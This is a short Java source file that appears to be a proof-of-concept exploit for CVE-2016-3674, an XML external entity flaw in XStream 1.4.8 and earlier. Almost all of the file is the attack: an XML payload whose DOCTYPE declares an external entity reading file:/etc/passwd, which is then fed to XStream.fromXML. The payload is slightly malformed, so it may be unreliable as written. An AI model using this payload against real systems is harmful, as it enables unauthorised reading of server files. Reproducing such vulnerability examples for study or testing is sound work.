package org.example;

import com.thoughtworks.xstream.XStream;

/**
 * File Read <=1.4.8
 */
public class CVE_2016_3674 {
    public static void main(String[] args) {
        String xml = "<?xml version=\"1.0\">\n" +
                "  <!DOCTYPE root [\n" +
                "    <!ELEMENT string (#PCDATA)>\n" +
                "    <!ENTITY content SYSTEM \"file:/etc/passwd\">\n" +
                "    %content;\n" +
                "]><string>test</string>";

        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }

}
